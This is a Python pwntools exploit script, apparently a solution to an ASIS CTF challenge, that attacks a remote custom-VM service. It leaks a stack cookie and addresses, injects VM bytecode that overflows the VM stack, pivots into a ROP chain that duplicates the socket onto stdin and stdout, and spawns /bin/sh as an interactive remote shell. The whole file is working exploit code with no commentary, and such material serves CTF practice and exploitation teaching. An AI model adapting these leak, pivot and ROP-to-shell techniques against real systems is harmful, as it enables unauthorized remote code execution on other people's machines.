import pwn

r = pwn.remote('semanager.asis-ctf.ir', 9797)
r.recvuntil('choice> ')

buf = 'hello'
r.send(buf)
leak = r.recvall()

print `leak[:0x110]`

cookie = pwn.u32(leak[0x100-8:0x100-4])
print 'Cookie is {:0x}'.format(cookie)
bp = pwn.u32(leak[0x100:0x104])
stack = bp + 4
print 'BP is {:0x}, stack is {:0x}'.format(bp, stack)
ret = pwn.u32(leak[0x104:0x108])
mem = ret - 0x10ce
print 'Return is {:0x}, memory is {:0x}'.format(ret, mem)

def execve():
    from struct import pack

    # Padding goes here
    p = ''

    p += pack('<I', 0x08070feb) # pop edx ; ret
    p += pack('<I', 0x080ec300) # @ .data
    p += pack('<I', 0x080ba7a6) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x0805628b) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x08070feb) # pop edx ; ret
    p += pack('<I', 0x080ec304) # @ .data + 4
    p += pack('<I', 0x080ba7a6) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x0805628b) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x08070feb) # pop edx ; ret
    p += pack('<I', 0x080ec308) # @ .data + 8
    p += pack('<I', 0x0804a963) # xor eax, eax ; ret
    p += pack('<I', 0x0805628b) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x08048185) # pop ebx ; ret
    p += pack('<I', 0x080ec300) # @ .data
    p += pack('<I', 0x080d9159) # pop ecx ; ret
    p += pack('<I', 0x080ec308) # @ .data + 8
    p += pack('<I', 0x08070feb) # pop edx ; ret
    p += pack('<I', 0x080ec308) # @ .data + 8
    p += pack('<I', 0x0804a963) # xor eax, eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0807ca76) # inc eax ; ret
    p += pack('<I', 0x0804efb5) # int 0x80
    return p

TOMBSTONE = 0x8048c53
# 0x08071760: int 0x80 ; ret  ;  (1 found)
INT_80 = 0x08071760
# 0x080ba7a6: pop eax ; ret  ;  (1 found)
POP_EAX = 0x080ba7a6
# 0x080bce7d: pop ebx ; ret  ;  (1 found)
POP_EBX = 0x080bce7d
# 0x080e1475: pop ecx ; ret  ;  (1 found)
POP_ECX = 0x080e1475
# 0x080e7e94: pop esp ; ret  ;  (1 found)
POP_ESP = 0x080e7e94

# 0x080ba36b: xchg eax, esp ; ret  ;  (1 found)
PIVOT = 0x080ba36b

# second rop (after second pivot)
# address of second stage in memory
ROP_MEM = 0x80ed000
rop = ""

# dup2 client_fd -> 0
rop += pwn.p32(POP_EAX)
rop += pwn.p32(63) # dup2
rop += pwn.p32(POP_ECX)
rop += pwn.p32(0)
rop += pwn.p32(INT_80)

# dup2 client_fd -> 1
rop += pwn.p32(POP_EAX)
rop += pwn.p32(63) # dup2
rop += pwn.p32(POP_ECX)
rop += pwn.p32(1)
rop += pwn.p32(INT_80)

# execve(/bin/sh)
rop += execve()

shell = ""

# read rop from socket into ROP_MEM
shell += "0000020107" # mov r1, r7
shell += "00040502" + pwn.p32((ROP_MEM-mem)&0xFFFFFFFF).encode('hex') # mov r2, 0x804ed00
shell += "00040503" + pwn.p32(len(rop)).encode('hex') # mov r3, len(fname)+1
shell += "0004050003000000" # mov r0, 0x3
shell += "0d8800" # syscall

# write PIVOT (first pivot) into opcode table at 0xFF
shell += "00040500" + pwn.p32((PIVOT)&0xFFFFFFFF).encode('hex') # mov r0, PIVOT
shell += "00040501" + pwn.p32((0x80ee63c-mem)&0xFFFFFFFF).encode('hex') # mov r1, op_FF
shell += "0010020100" # mov [r1], r0

# prepare second ropchain / first pivot - client FD -> EBX, main rop -> ESP
shell += "00040500" + pwn.p32(POP_EBX).encode('hex') # mov r0, POP_EBX
shell += "0000020107" # mov r1, r7
shell += "00040502" + pwn.p32(POP_ESP).encode('hex') # mov r2, POP_ESP
shell += "00040503" + pwn.p32(ROP_MEM).encode('hex') # mov r3, rop

# exec opcode FF
shell += "FF0000"

# spin
shell += "05880400000000"

r = pwn.remote('semanager.asis-ctf.ir', 9797)
r.recvuntil('choice> ')

buf = shell.decode('hex')
if len(buf) > 0x100-8:
    raise 'whoops'

# smash VM stack
# crap
buf += 'a'*((0x100-8)-len(buf))
# stack cookie
buf += pwn.p32(cookie)
buf += pwn.p32(0xdeadbeef)
buf += pwn.p32(0xdeadbeef)
# pointer to the shellcode on the stack
buf += pwn.p32(mem + (stack - 0x110c))
r.send(buf)
r.recvn(0x1000)

r.send(rop)

#r.send(fname + "\x00")


r.interactive()
